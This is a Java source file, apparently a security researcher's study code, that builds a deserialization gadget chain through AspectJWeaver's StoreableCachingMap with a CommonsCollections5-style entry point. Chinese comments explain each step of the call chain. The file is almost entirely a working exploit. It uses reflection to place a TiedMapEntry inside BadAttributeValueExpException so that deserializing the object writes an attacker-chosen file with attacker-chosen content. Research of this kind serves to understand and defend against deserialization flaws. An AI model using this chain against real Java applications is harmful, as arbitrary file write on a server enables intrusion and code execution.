import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

import static util.Util.serialize;
import static util.Util.unserialize;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/5
 */




/*
* 调用链：
* BadAttributeValueExpException.readObject()
   TiedMapEntry.toString()
        LazyMap.get()
            HashMap.put()
                StoreableCachingMap.put()
                    StoreableCachingMap.writeToPath()
*
* */
/*
* 主要逻辑：StoreableCachingMap.put方法，重写了HashMap的put方法，调用了writeToPath方法写入到文件中，实现写入。
* 如何调用StoreableCachingMap.put方法，因为继承了HashMap,理所当然用HashMap，那入口处可以是LazyMap。
* 注意：在StoreableCachingMap的writeToPath中的文件路径包含自身的folder还有key的值，所以要求入口的key值要可控才能实现任意文件写入。
* 入口点跟CC5基本一致，那么可以使用CC1的入口进行调用吗？ 很明显是不行的，无法达到任意文件写入，主要在于LazyMap的key不可控，那里需要传入方法名，entry
* */


public class AspectJWeaver_CC5 {
    public static void main(String[] args) throws Exception {
        Class  StoreableCachingMapClass= Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor StoreableCachingMapConstructor = StoreableCachingMapClass.getDeclaredConstructor(String.class,int.class);
        StoreableCachingMapConstructor.setAccessible(true);
        HashMap hashMap= (HashMap) StoreableCachingMapConstructor.newInstance("C:/D",3);  // StoreableCachingMap中

        // 这里使用一个ConstantTransformer.transform方法来返回LazyMap中的value的值，这个传入的值就是写入文件的内容。
        ConstantTransformer constantTransformer= new ConstantTransformer("dragonkeep2".getBytes(StandardCharsets.UTF_8));
        Map lazyMap = LazyMap.decorate(hashMap,constantTransformer);
        TiedMapEntry tiedMapEntry =new TiedMapEntry(lazyMap,"dragonkeep1");  //这个key对应文件名称

        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException("dragonkeep");
        Field field=BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMapEntry);

        serialize(badAttributeValueExpException);
        unserialize();

    }
}
